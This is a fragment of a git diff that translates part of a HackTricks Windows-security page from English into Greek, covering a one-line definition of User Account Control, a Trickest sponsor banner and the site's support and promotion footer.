-## UAC - User Account Control
-
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**.
+[Ο Έλεγχος Χρήστη Λογαριασμού (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια λειτουργία που επιτρέπει ένα **παράθυρο συναίνεσης για αυξημένες δραστηριότητες**.
 
 {% content-ref url="windows-security-controls/uac-user-account-control.md" %}
 [uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
@@ -286,8 +244,8 @@ The SSPI will be in charge of finding the adequate protocol for two machines tha
 <figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να αυτοματοποιήσετε ροές εργασίας με τα πιο προηγμένα εργαλεία της κοινότητας.\
+Αποκτήστε πρόσβαση σήμερα:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -295,14 +253,14 @@ Get Access Today:
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Εάν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε μορφή PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
